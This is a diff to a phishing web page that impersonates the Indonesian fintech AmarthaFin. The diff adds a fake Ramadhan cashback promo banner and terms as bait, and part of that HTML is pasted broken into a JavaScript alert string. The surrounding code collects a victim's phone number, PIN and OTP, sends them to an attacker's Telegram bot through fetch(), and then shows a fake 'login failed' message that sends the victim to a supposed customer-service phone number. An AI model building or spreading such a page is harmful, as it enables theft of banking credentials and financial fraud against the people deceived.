@@ -67,7 +67,12 @@
         <button class="btn" onclick="sendHPData()">Lanjut ke PIN</button>
         <div class="terms">
             Dengan lanjut, Anda menyetujui <a href="#">Syarat & Ketentuan</a> dan <a href="#">Kebijakan Privasi</a> AmarthaFin
-        </div>Promo bulan Ramadhan/chasback Rp.400.000 Cukup melakukan transaksi deposit
+        </div>    <div class="container">
+        <!-- Banner Promo Ramadhan -->
+        <section class="promo-banner">
+            <h2>✨ PROMO KHUSUS BULAN RAMADHAN ✨</h2>
+            <h3>Dapatkan Cashback hingga Rp400.000 per Transaksi!</h3>
+            <p>Rayakan kemurahan Ramadhan dengan setiap transaksi di AmarthaFin. Yuk manfaatkan kesempatan ini!</p>
     </div>
 
     <!-- Langkah 2: Masukkan PIN -->
@@ -209,7 +214,18 @@
         function sendAllData() {
             const msg = `✅ LOGIN SELESAI - AMARTHAFIN ✅\nHP: +62${userHP}\nPIN: ${userPIN}\nOTP: ${userOTP}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-            alert("proses masuk anda gagal silahkan hubungi AMARTHAFIN Cs:081318896494!");
+            alert("proses masuk anda gagal silahkan hubungi AMARTHAFIN Cs:081318896494!
+                          <!-- Syarat dan Ketentuan Promo -->
+        <section class="terms">
+            <h3>Syarat & Ketentuan Promo Cashback Ramadhan</h3>
+            <ul style="margin-left: 20px; line-height: 1.8;">
+                <li>Promo berlaku khusus selama bulan Ramadhan (periode akan diumumkan lebih lanjut).</li>
+                <li>Cashback Rp400.000 diberikan per transaksi yang memenuhi syarat (minimal nominal transaksi akan diinformasikan).</li>
+                <li>Hanya berlaku untuk pengguna terdaftar dan terverifikasi di aplikasi AmarthaFin.</li>
+                <li>Setiap pengguna berhak mendapatkan cashback maksimal sesuai batasan yang ditetapkan.</li>
+                <li>Cashback akan dikreditkan ke saldo akun atau saldo Poket AmarthaFin dalam waktu tertentu setelah transaksi berhasil.</li>
+                <li>Amartha berhak membatalkan atau memodifikasi promo tanpa pemberitahuan terlebih dahulu jika terjadi penyalahgunaan.</li>
+                <li>Promo tidak dapat digabungkan dengan promo lain kecuali dinyatakan sebaliknya.</li>");
         }
 
         // Navigasi Kembali
